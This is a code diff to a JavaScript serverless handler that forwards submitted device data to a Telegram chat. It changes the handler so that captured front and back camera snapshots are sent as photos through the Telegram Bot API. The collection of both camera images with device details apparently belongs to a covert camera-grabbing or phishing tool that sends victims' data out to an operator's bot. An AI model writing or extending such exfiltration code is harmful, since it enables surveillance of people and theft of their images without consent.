@@ -38,28 +38,56 @@ export default async (req, res) => {
     `- Charging: ${d.charging}\n\n` +
 
     `📷 **Camera Status:**\n` +
-    `- ${d.cameraStatus}\n\n` +
+    `- ${d.cameraStatus}\n`;
 
-    `📸 **Front Camera Snapshot:**\n` +
-    `- ${d.frontCameraImage ? 'Captured' : 'Failed'}\n\n` +
+    // Send images separately if they exist
+    if (d.frontCameraImage) {
+      await fetch(
+        `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`,
+        {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: telegramId,
+            photo: d.frontCameraImage,
+            caption: 'Front Camera Snapshot'
+          })
+        }
+      );
+    }
 
-    `📸 **Back Camera Snapshot:**\n` +
-    `- ${d.backCameraImage ? 'Captured' : 'Failed'}`;
+    if (d.backCameraImage) {
+      await fetch(
+        `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`,
+        {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: telegramId,
+            photo: d.backCameraImage,
+            caption: 'Back Camera Snapshot'
+          })
+        }
+      );
+    }
 
-    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: telegramId,
-        text: message,
-        parse_mode: 'Markdown'
-      })
-    });
+    // Send the main message
+    await fetch(
+      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: telegramId,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      }
+    );
 
     res.status(200).json({ success: true });
-
   } catch (error) {
     console.error('Submit Error:', error);
-    res.status(500).json({ error: 'Failed to send to Telegram' });
+    res.status(500).json({ error: error.message || 'Failed to send to Telegram' });
   }
 };
